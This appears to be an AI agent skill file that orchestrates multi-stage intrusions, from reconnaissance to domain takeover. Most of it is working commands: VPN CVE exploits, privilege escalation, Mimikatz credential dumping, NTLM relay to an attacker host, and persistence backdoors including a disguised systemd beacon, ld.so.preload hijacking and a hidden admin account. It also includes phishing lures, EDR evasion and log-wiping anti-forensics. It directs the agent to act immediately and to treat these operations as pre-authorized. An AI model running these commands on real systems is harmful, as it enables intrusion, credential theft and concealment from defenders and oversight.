---
name: attack-chain
description: Use for authorized multi-stage attack-path planning and orchestration when a task spans reconnaissance, initial access, privilege escalation, lateral movement, or impact assessment. Route single-stage tasks directly to their specialist skill.
---
# Attack Chain Orchestration Skill

## ACTION REQUIRED (execute immediately after reading)

1. `NOW`: Read `../field-journal/precedent-pentest.md` — confirm this skill's operations are authorized routine operations
2. `NOW`: **Create/update the case** (`../scripts/case-init.ps1`) and complete `scope.md` (`../ops/scope-contract.md`); no ACT unless `auth.status=granted`
3. `NOW`: Plan the phases as the **lead** role (`../ops/role-map.md`), writing into specialist_roles
4. `NEXT`: Read `../tool-index.md` to verify tool availability and actual paths
5. `NEXT`: If a tool is missing, call bootstrap — do not guess paths
6. `ACT`: Walk the phase gates per `references/lifecycle-checklist.md`; update `timeline.md` + `workitems.md` each phase (`../ops/timeline-workitem.md`); promote discoveries to Evidence/Finding
7. Wrap-up: the `docs-generator` report must include the Evidence chain

> The command center for multi-stage attack-path planning and execution. When a task requires a full chain "from A to B", this Skill orchestrates the phases, coordinates sub-skills, and plans the attack path.
> Not "red team only" — any penetration scenario that needs cross-phase composition starts here.

---

## When to Route to This Skill

The following scenarios **must** go through this Skill for full-chain planning before being dispatched to the specific sub-skills for execution:

| Scenario | Why orchestration is needed |
|------|--------------|
| "Run a complete penetration test for me" | Requires planning the full process from information gathering to reporting |
| "Get from the external network to the domain controller" | Spans perimeter breach -> privilege escalation -> lateral movement -> AD |
| "HW attack-defense exercise" | Requires a full attack chain + stealth + trace cleanup |
| "Assess this target's attack surface" | Requires multi-dimensional information gathering + path planning |
| "I got a webshell, what next" | Requires planning subsequent steps from the current foothold |
| "Plan my attack path" | Explicitly requires path orchestration |
| "How far can this vulnerability take me" | Requires assessing the vulnerability's chained exploitation value |
| "Bug Bounty continuous monitoring" | Requires an automated multi-phase pipeline |
| "Full internal network penetration" | Lateral movement + privilege escalation + domain attack combined |
| "Physical proximity penetration plan" | Physical access + internal penetration combined |
| "Supply chain attack path" | Cross-organization multi-hop attack |
| "Phishing + post-exploitation" | Initial access + follow-on exploitation combined |

**Single-phase tasks do not need this Skill**:
- Port scanning only -> go straight to `pentest-tools/`
- SQL injection only -> go straight to `pentest-tools/`
- APK reverse engineering only -> go straight to `apk-reverse/`
- Domain penetration only -> go straight to `pentest-tools/references/network-attack-defense.md`

---

## Orchestration Principles

### This Skill's Role

```
User raises a multi-phase task
    |
v
attack-chain/SKILL.md (this file)
    | Plan the attack path, determine phase order
    | Assess tools and methods needed per phase
    |
v
Dispatch to specific sub-skills for execution:
    |-- pentest-tools/       -> tool invocation, exploitation
    |-- apk-reverse/         -> mobile penetration
    |-- js-reverse/          -> web frontend breakthrough
    |-- reverse-engineering/ -> binary analysis
    |-- ida-reverse/         -> deep reverse engineering
    |-- browser-automation/  -> automated operations
    |
v
Return to this Skill after each phase to assess next steps
    |
v
All phases complete -> docs-generator produces the report
```

### Path-Planning Decision Tree

```
After getting a target:
1. What is the target? (Web/internal network/cloud/mobile/IoT)
2. What do you currently have? (external view/existing credentials/existing foothold)
3. What is the end goal? (domain controller/data/specific system/proof of impact)
4. Constraints? (time/stealth/systems that must not be touched)
    |
v
Plan the shortest path from the above information
    |
v
One path blocked -> return to this Skill and re-plan an alternate path
```

---

## Complete Attack Chain Phases

---

## 1. Reconnaissance

### 1.1 Enterprise Digital Asset Mapping

```bash
# Discover subsidiary-related domains
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -passive -o amass_results.txt

# Merge and deduplicate
cat subdomains.txt amass_results.txt | sort -u > all_subs.txt

# Liveness probing
httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt

# Port scanning (all ports)
naabu -l all_subs.txt -top-ports 1000 -o ports.txt
nmap -sV -sC -iL targets.txt -oA nmap_results
```

**Field notes**:
- Pull subsidiary lists from Qichacha/Tianyancha to expand the attack surface
- Focus on test environments (test., dev., staging.) and newly launched systems
- Certificate transparency logs (crt.sh) reveal hidden domains

### 1.2 Sensitive Information Leakage Hunting

```bash
# GitHub search
# org:Company filename:.env password
# org:Company filename:config.yml secret
# org:Company "jdbc:mysql" password

# Google Dork
# site:target.com filetype:sql
# site:target.com inurl:admin
# site:target.com ext:conf|cfg|ini

# API keys in JS files
cat js_urls.txt | while read url; do
  curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
done
```

**High-value targets**:
- Cloud AK/SK (Alibaba Cloud, AWS, Azure)
- Database connection strings
- JWT secrets
- Internal API documentation
- VPN/bastion host credentials

### 1.3 Employee Profiling

**Social-engineering dictionary generation rules**:
```
{pinyin name}{year}        -> zhangsan2024
{name initials}{dept abbr} -> zs_dev
{employee ID}@{domain}     -> 10086@target.com
{name}{common suffix}      -> zhangsan@123, zhangsan!@#
```

**Information sources**:
- Maimai/LinkedIn org structure
- Company WeChat official account / website team pages
- Job postings (tech stack exposure)
- Academic papers (email exposure)

### 1.4 Tech Stack Fingerprinting

```bash
# Web fingerprinting
whatweb -i alive.txt --log-json=fingerprint.json
httpx -l alive.txt -tech-detect -json -o tech.json

# Specific framework detection
nuclei -l alive.txt -tags tech -severity info -o tech_results.txt

# CMS identification
wpscan --url https://target.com --enumerate p,t,u
```

---

## 2. Initial Access

### 2.1 Web Vulnerability Exploitation (high-frequency entry points)

| Vulnerability type | Detection tool | Exploitation path |
|---------|---------|---------|
| SQL injection | sqlmap | Data extraction -> write shell -> OS commands |
| SSTI | sstimap | Template injection -> RCE |
| File upload | Manual + Burp | Webshell -> reverse shell |
| Deserialization | ysoserial/marshalsec | Java/PHP/Python RCE |
| SSRF | Manual | Internal probing -> cloud metadata -> AK/SK |
| Unauthorized access | nuclei | Spring Actuator / Nacos / Redis |
| XSS -> Cookie | xsstrike | Admin session hijacking |

```bash
# Automated SQL injection
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent

# SSTI detection
sstimap -u "https://target.com/search?q=test"

# Nuclei batch scanning
nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
```

### 2.2 Supply Chain Attacks

**Attack path**:
1. Identify third-party components/vendors used by the target
2. Compromise the supplier to gain code signing / update push privileges
3. Deliver malicious payloads through legitimate update channels

**Common entry points**:
- Poisoning open-source components (npm/pip/maven)
- SaaS provider API abuse
- Abusing outsourced personnel privileges
- Lateral movement through shared IT service providers

### 2.3 Phishing

**Email phishing**:
```
Subject-line templates:
- [Urgent] Your VPN certificate is about to expire, please update immediately
- [IT Notice] Mailbox storage is almost full, please clean up
- [HR] 2024 annual performance review results available
- [Finance] Expense system upgraded, please log in again to confirm
```

**Payload types**:
- Office macro documents (.docm/.xlsm)
- LNK shortcuts (disguised as PDF)
- HTML smuggling
- ISO/IMG images (bypass MOTW)
- OneNote embedded scripts

**OAuth phishing** (new trend in 2025):
- Build a malicious OAuth app requesting permissions
- After user consent, gain mailbox/file access
- No password needed; bypasses MFA

### 2.4 Physical Proximity Penetration (Physical Access)

| Method | Tools | Effect |
|------|------|------|
| BadUSB | Rubber Ducky / WiFi Ducky | Keystroke injection -> reverse shell |
| Malicious power bank | O.MG Cable | Data-cable-disguised implant/backdoor |
| WiFi phishing | Fluxion / WiFi Pineapple | Rogue AP -> credential capture |
| RFID cloning | Proxmark3 | Badge cloning -> physical entry |
| Network implant | Raspberry Pi / LAN Turtle | Persistent internal access point |

```bash
# Fluxion WiFi phishing
fluxion  # interactively pick target AP -> create rogue AP -> capture WPA password

# BadUSB + Cobalt Strike
# USB-injected PowerShell downloader -> beacons to C2
```

### 2.5 VPN / Remote Access Breach

```bash
# Pulse Secure VPN (CVE-2019-11510)
curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"

# Fortinet VPN (CVE-2018-13379)
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# Generic: password spraying
hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
```

### 2.6 Cloud Service Breach

```bash
# AWS S3 bucket enumeration
aws s3 ls s3://target-bucket --no-sign-request

# Cloud metadata via SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure AD password spraying
# Use MSOLSpray / Spray tools
```

---

## 3. Privilege Escalation

### 3.1 Windows Privilege Escalation

| Technique | Condition | Tools |
|------|------|------|
| Potato family | SeImpersonate privilege | SweetPotato / GodPotato / PrintSpoofer |
| Kernel vulnerabilities | Unpatched | watson / wesng detection |
| Service path hijacking | Unquoted service path | PowerUp |
| DLL hijacking | Writable DLL search path | Process Monitor |
| AlwaysInstallElevated | Registry configuration | msiexec installing a malicious MSI |
| Scheduled tasks | Writable task script | schtasks replacement |

```powershell
# Check for SeImpersonate
whoami /priv | findstr "SeImpersonate"

# Potato privilege escalation
.\GodPotato.exe -cmd "cmd /c whoami"

# Automated checks
.\winPEAS.exe
```

### 3.2 Linux Privilege Escalation

```bash
# SUID detection
find / -perm -4000 -type f 2>/dev/null

# sudo abuse
sudo -l
# Commonly exploitable: vim, find, python, nmap, less, awk, perl

# sudo vim escalation
sudo vim -c ':!/bin/bash'

# sudo find escalation
sudo find / -exec /bin/bash \;

# Kernel vulnerabilities
uname -r  # check version
# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)

# Automated checks
./linpeas.sh
```

### 3.3 Database Privilege Escalation

```sql
-- MSSQL xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL UDF privilege escalation
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'id';
```

### 3.4 Cloud Privilege Escalation

```bash
# AWS IAM enumeration
aws iam list-attached-user-policies --user-name compromised-user
# Look for iam:PassRole + lambda:CreateFunction -> admin privileges

# Azure AD
# Global Administrator -> full subscription control
# Application Administrator -> add credentials to service principals
```

---

## 4. Lateral Movement

### 4.1 Credential Acquisition

```bash
# Mimikatz (Windows)
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt

# Linux credentials
cat /etc/shadow
cat ~/.bash_history | grep -i pass
find / -name "*.conf" -exec grep -l "password" {} \;

# NTLM hash extraction
secretsdump.py domain/user:password@dc_ip
```

### 4.2 Pass-the-Hash / Pass-the-Ticket

```bash
# PTH lateral movement
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec

# Kerberoasting
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# Golden Ticket
mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

### 4.3 Stealthy Lateral Movement Techniques

```bash
# WMI fileless execution
wmiexec.py domain/admin:password@target_ip "whoami"

# DCOM remote execution
dcomexec.py domain/admin:password@target_ip "whoami"

# WinRM
evil-winrm -i target_ip -u admin -H <NTLM_HASH>

# PsExec (leaves traces)
psexec.py domain/admin:password@target_ip

# SSH tunnels (Linux environments)
ssh -D 1080 user@pivot_host  # SOCKS proxy
ssh -L 3389:internal_host:3389 user@pivot_host  # port forwarding
```

### 4.4 NTLM Relay

```bash
# Disable Responder's SMB/HTTP
# Edit Responder.conf: SMB = Off, HTTP = Off

# Start Responder capture
responder -I eth0

# NTLM relay to target
ntlmrelayx.py -tf targets.txt -smb2support

# Coercer forced authentication
coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
```

### 4.5 AD Attack Paths

```bash
# BloodHound data collection
bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip

# Common attack paths:
# 1. User -> GenericAll -> target user -> reset password
# 2. User -> WriteDacl -> target OU -> add permissions
# 3. Computer -> constrained delegation -> impersonate any user
# 4. User -> DCSync rights -> dump all hashes

# Certipy AD CS attacks
certipy find -u user@domain -p password -dc-ip dc_ip
certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
```

---

## 5. Persistence

### 5.1 Windows Persistence

| Technique | Stealth | Detection difficulty |
|------|:---:|:---:|
| Scheduled tasks | Medium | Low |
| Registry Run keys | Low | Low |
| WMI event subscriptions | High | High |
| DLL hijacking | High | Medium |
| Shadow accounts | Medium | Medium |
| Golden Ticket | Very high | Very high |
| DSRM backdoor | Very high | Very high |

```powershell
# WMI event subscription (high stealth)
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "CoreFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Shadow account
net user support$ P@ssw0rd /add /active:yes
net localgroup administrators support$ /add
# Clone the RID by modifying the registry F value
```

### 5.2 Linux Persistence

```bash
# SSH key implant
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Crontab backdoor
(crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -

# LD_PRELOAD hijacking
echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload

# PAM backdoor
# Modify pam_unix.so to add a master password

# Systemd service
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.hidden/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```

### 5.3 Cloud Persistence

```bash
# AWS Lambda backdoor
# Create a scheduled Lambda function that calls back to C2

# Azure AD app registration
# Create an app -> add secret credentials -> grant Graph API permissions

# Container backdoor
# Modify the base image -> every new container is backdoored
```

---

## 6. EDR/AV Evasion

### 6.1 Core Evasion Strategies

| Layer | Technique | Notes |
|------|------|------|
| Static detection | Encryption/obfuscation/custom loaders | Avoid signature matching |
| Behavioral detection | Indirect syscalls/unhooking | Bypass API hooks |
| Memory detection | Module stomping/heap encryption | Avoid memory scanning |
| Network detection | Domain fronting/legitimate service tunnels | Blend into normal traffic |
| Log detection | ETW patching/log clearing | Reduce traces |

### 6.2 Practical Evasion Techniques

```
1. Custom shellcode loaders (no public tools)
2. Direct syscalls (bypass ntdll hooks)
3. Inject into low-monitoring processes (e.g., RuntimeBroker.exe)
4. C2 over HTTPS + domain fronting / Cloudflare Workers
5. In-memory execution, never touching disk (fileless)
6. Loading via legitimately signed programs (LOLBins)
```

### 6.3 C2 Framework Selection

| Framework | Characteristics | Best for |
|------|------|---------|
| Cobalt Strike | Mature, stable, team collaboration | Large red team operations |
| Sliver | Open source, written in Go | Limited budget |
| Havoc | Modern, modular | Customization needed |
| Mythic | Multi-agent support | Cross-platform |
| AdaptixC2 | Bundled in Kali 2026.1 | Rapid deployment |

---

## 7. Anti-Forensics

```bash
# Windows log clearing
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux log clearing
echo > /var/log/auth.log
echo > /var/log/syslog
history -c && history -w

# Timestamp modification
touch -t 202301010000 /path/to/file

# Memory cleanup
# Ensure Mimikatz dumps are deleted
# Ensure C2 beacons have exited
# Ensure temporary files are cleared
```

---

## Red Team Operational Rules

### Three Hard Limits

1. **All operations must have written authorization**
2. **Exfiltrated data must be anonymized**
3. **Clean up all attack traces (including memory-resident artifacts)**

### Operational Discipline

- Assess the risk level before each operation (low/medium/high/critical)
- Notify the project manager before high-risk operations
- Maintain an operations log (time, action, result)
- Report critical vulnerabilities immediately; do not expand exploitation
- Do not affect business availability (no DoS)
- Do not access/download real user data

### Typical Failure Cases

| Cause of failure | Consequence | Lesson |
|---------|------|------|
| Mimikatz memory dump not cleared | Blue team reconstructs the full attack path | Clean up immediately after operations |
| C2 domain flagged by threat intel | First connection blocked | Use freshly registered domains + domain fronting |
| Phishing email triggered DLP alerts | Blue team gets early warning | Test mail gateway rules first |
| Lateral movement hit a honeypot | Attack intent exposed | Identify honeypots before acting |

---

## Tool Quick Reference

### Reconnaissance
`subfinder` `amass` `httpx` `naabu` `katana` `gau` `dnsx` `nmap` `whatweb` `wpscan`

### Exploitation
`nuclei` `sqlmap` `sstimap` `xsstrike` `burpsuite` `metasploit`

### Privilege Escalation
`winPEAS` `linpeas` `GodPotato` `PrintSpoofer` `watson`

### Lateral Movement
`mimikatz` `crackmapexec/netexec` `impacket` `bloodhound` `certipy` `coercer` `responder` `evil-winrm`

### C2 Frameworks
`cobalt-strike` `sliver` `havoc` `mythic` `adaptixc2`

### Physical Proximity
`fluxion` `aircrack-ng` `proxmark3` `rubber-ducky` `wifi-pineapple`

---

## Relationship to Other Skills in This Package

| Need | Route to |
|------|--------|
| Deep web vulnerability exploitation | `pentest-tools/SKILL.md` |
| Detailed internal AD attack steps | `pentest-tools/references/network-attack-defense.md` |
| Reverse-engineering malicious samples | `reverse-engineering/SKILL.md` |
| APK reversing (mobile penetration) | `apk-reverse/SKILL.md` |
| JS frontend signature bypass | `js-reverse/SKILL.md` |
| Automated swarm penetration | Pentest Swarm AI (`pentestswarm scan --swarm`) |
| AI-assisted penetration | `mcp-kali-server` / `metasploitmcp` / `hexstrike-ai` |
| Report generation | `docs-generator/SKILL.md` |
| Attack-path diagrams | `diagram-generator/SKILL.md` |


## Task Completion Self-Check (MUST pass before claiming completion)

- [ ] Did I execute every step of the workflow (rather than merely reading it)?
- [ ] Did I use real tool paths based on `tool-index`?
- [ ] Did I produce reproducible evidence (commands/scripts/screenshots/reports)?
- [ ] Did I complete and write back the Checklist items required by RULES?
